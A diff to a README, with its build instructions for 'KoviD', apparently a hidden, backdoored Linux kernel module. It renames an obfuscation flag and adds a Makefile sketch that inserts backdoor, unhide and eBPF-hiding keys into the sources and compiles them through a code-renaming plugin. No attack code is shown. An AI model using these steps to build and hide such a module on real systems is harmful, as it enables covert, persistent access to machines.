@@ -23,10 +23,10 @@ These are the steps to build with `gcc` compiler.
 Build KoviD:
 
 ```
-$ make PROCNAME="myprocname" OBFUSCATE_WITH_GCC=1
+$ make PROCNAME="myprocname" OBFUSCATE=1
 ```
 
-## Build with `clang`
+## Build with `clang` (EXPERIMENTAL)
 
 These are the steps to build with LLVM/Clang compiler.
 
@@ -80,4 +80,32 @@ $ sudo make LLVM=1 LLVM_IAS=1 -j4 CC=clang-19 CXX=clang++-19 KCFLAGS="-Wno-error
 
 $ export PATH=/usr/lib/llvm-19/bin/:$PATH
 $ make PROCNAME="myprocname" OBFUSCATE_WITH_CLANG=1 CC=clang-19 CXX=clang++-19 LLVM=1 LLVM_IAS=1
+```
+
+### TODO
+
+Obfuscation with `clang` does not work end to end, since linux+clang build is not mature enough. So, we remove that for now.
+
+Basically, in `Makefile` we should just add:
+
+```
+ifdef OBFUSCATE_WITH_CLANG
+CC=clang-19
+COMPILER_OPTIONS := ${COMPILER_OPTIONS} \
+	-fplugin="/usr/local/lib/libKoviDRenameCodeLLVMPlugin.so"
+endif
+...
+all:
+ifndef OBFUSCATE_WITH_CLANG
+	$(if $(PROCNAME),,$(error ERROR: PROCNAME is not defined. Please invoke make with PROCNAME="your_process_name"))
+	@sed -i "s/\(uint64_t auto_bdkey = \)[^;]*;/\1$(BDKEY);/" src/sock.c
+	@sed -i "s/\(uint64_t auto_unhidekey = \)[^;]*;/\1$(UNHIDEKEY);/" src/kovid.c
+	@sed -i "s/\(uint64_t auto_ebpfhidenkey = \)[^;]*;/\1$(EBPFHIDEKEY);/" tools/ebpf/main.c
+	make -C /lib/modules/6.8.0/build M=$(PWD) CC=clang-19 \
+        CONFIG_CC_IS_CLANG=1 \
+        KBUILD_CFLAGS="-O2 -Qunused-arguments -fno-integrated-as -Wno-error -fplugin=\"/usr/local/lib/KoviDRenameCodePlugin.so\"" \
+        KBUILD_CFLAGS_EXTRA="-fno-integrated-as -fgnu89-inline -Wno-error=asm -fsanitize=bounds" \
+        modules
+else
+...
 ```
